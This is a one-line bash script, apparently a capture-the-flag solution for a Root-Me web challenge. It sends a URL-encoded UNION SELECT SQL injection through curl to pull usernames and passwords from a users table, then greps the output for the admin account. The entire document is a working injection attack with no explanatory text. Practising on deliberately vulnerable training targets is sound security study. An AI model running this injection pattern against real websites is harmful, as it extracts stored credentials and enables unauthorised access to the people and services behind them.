#!/bin/bash
echo $(curl -s "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20UNION%20SELECT%201%2cusername%2cpassword%20FROM%20users--") | grep "admin"
